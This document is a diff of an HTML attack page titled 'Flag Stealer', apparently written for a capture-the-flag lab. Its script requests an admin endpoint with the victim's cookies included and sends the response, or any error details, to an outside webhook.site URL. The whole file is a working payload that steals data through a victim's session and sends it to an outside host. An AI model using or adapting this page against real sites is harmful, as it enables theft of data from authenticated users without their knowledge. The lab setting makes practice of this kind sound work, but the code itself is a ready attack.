@@ -2,39 +2,52 @@
 <html>
 <head>
     <meta charset="utf-8">
-    <title>Exfiltrating Flag via POST</title>
+    <title>Flag Stealer</title>
 </head>
 <body>
-    <h1>Flag Stealing In Progress</h1>
+    <h1>Stealing...</h1>
     <script>
-        (function () {
-            const webhook = "https://webhook.site/0a90930c-2196-4924-aac4-470557244914";
-            const flagURL = "https://cybershortlink-dc105f08.exam.cyberjutsu-lab.tech/api/admin/sup3rs3cr3t";
+        (async function () {
+            const webhookUrl = "https://webhook.site/0a90930c-2196-4924-aac4-470557244914";
+            const flagUrl = "https://cybershortlink-dc105f08.exam.cyberjutsu-lab.tech/api/admin/sup3rs3cr3t";
 
-            function sendToWebhook(data) {
-                fetch(webhook, {
+            try {
+                // Gửi GET để lấy FLAG
+                const flagResponse = await fetch(flagUrl, {
+                    method: "GET",
+                    credentials: "include", // Cho phép gửi cookie nếu cần
+                    headers: {
+                        "Accept": "application/json"
+                    }
+                });
+
+                const flagData = await flagResponse.json();
+
+                // Gửi FLAG về Webhook bằng POST
+                await fetch(webhookUrl, {
                     method: "POST",
                     headers: {
                         "Content-Type": "application/json"
                     },
-                    body: JSON.stringify(data)
-                }).catch(e => console.error("Webhook error", e));
-            }
-
-            fetch(flagURL)
-                .then(res => res.json())
-                .then(json => {
-                    sendToWebhook({
-                        stage: "FLAG2_RETRIEVED_SUCCESS",
-                        flag_payload: json
-                    });
-                })
-                .catch(err => {
-                    sendToWebhook({
-                        stage: "FETCH_ERROR",
-                        error: err.toString()
-                    });
+                    body: JSON.stringify({
+                        stage: "FLAG_RETRIEVED",
+                        flag: flagData
+                    })
                 });
+            } catch (error) {
+                // Báo lỗi nếu có
+                await fetch(webhookUrl, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        stage: "ERROR",
+                        message: error.message,
+                        stack: error.stack
+                    })
+                });
+            }
         })();
     </script>
 </body>
